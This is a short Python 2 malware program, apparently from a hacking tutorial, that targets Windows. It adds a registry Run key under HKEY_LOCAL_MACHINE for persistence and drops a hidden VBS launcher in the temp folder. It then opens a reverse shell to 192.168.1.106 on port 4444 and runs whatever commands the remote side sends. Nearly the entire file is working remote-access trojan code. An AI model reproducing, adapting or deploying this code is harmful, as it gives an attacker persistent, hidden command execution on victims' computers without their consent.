# HACKING WITH PYTHON

import os
import subprocess
import socket
import sys
import tempfile
from _winreg import *

MALWARE_NAME = "malware.exe"
TRIGGER = MALWARE_NAME.replace('.exe','')+".vbs"
KEY_PATH = "Software\Microsoft\Windows\CurrentVersion\Run"
KEY_NAME = "anarc0der_key"
REV_SHELL = "192.168.1.106"
SHELL_PORT = 4444
TRIGGER_PATH = tempfile.gettempdir()+"\\"+TRIGGER
MALWARE_PATH = tempfile.gettempdir()+"\\"+MALWARE_NAME

class My_malware():

    def persistence(self):
        key = OpenKey(HKEY_LOCAL_MACHINE, KEY_PATH)
        keys = []
        try:
            i=0
            while True:
                cur_key = EnumValue(key, i)
                keys.append(cur_key[0])
                i+=1
        except:
            pass
        if KEY_NAME not in keys:
            mlwr_key = OpenKey(HKEY_LOCAL_MACHINE, KEY_PATH, 0, KEY_ALL_ACCESS)
            SetValueEx(mlwr_key, KEY_NAME, 0, REG_SZ, TRIGGER_PATH)
            mlwr_key.Close()
            return False
        return True

    def run_and_hide(self):
        if os.path.exists(MALWARE_PATH) and os.path.exists(TRIGGER_PATH):
            return True
        else:
            payload = 'Set WshShell = WScript.CreateObject("WScript.Shell")\nWshShell.Run """{0}""", 0 , false'.format(MALWARE_PATH)
            with open(TRIGGER_PATH, 'w') as f:
                f.write(payload)
            os.system('copy %s %s'%(MALWARE_NAME, MALWARE_PATH))
            return False

    def reverse_shell(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((REV_SHELL,SHELL_PORT))
        s.send('\n\!/ anarc0der mlwr tutorial\n\n[*] If you need to finish, just type: quit\n[*] PRESS ENTER TO PROMPT\n\n')
        while True:
            data = s.recv(1024)
            if "quit" in data:
                break
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            saida_cmd = cmd.stdout.read() + cmd.stderr.read()
            s.send(saida_cmd)
            s.send("Comando: ")
        s.close()

def main():
    my_returns = []
    x = My_malware()
    my_returns.append(x.persistence())
    my_returns.append(x.run_and_hide())
    if all(res is True for res in my_returns):
        x.reverse_shell()

if __name__ == '__main__':
    main()
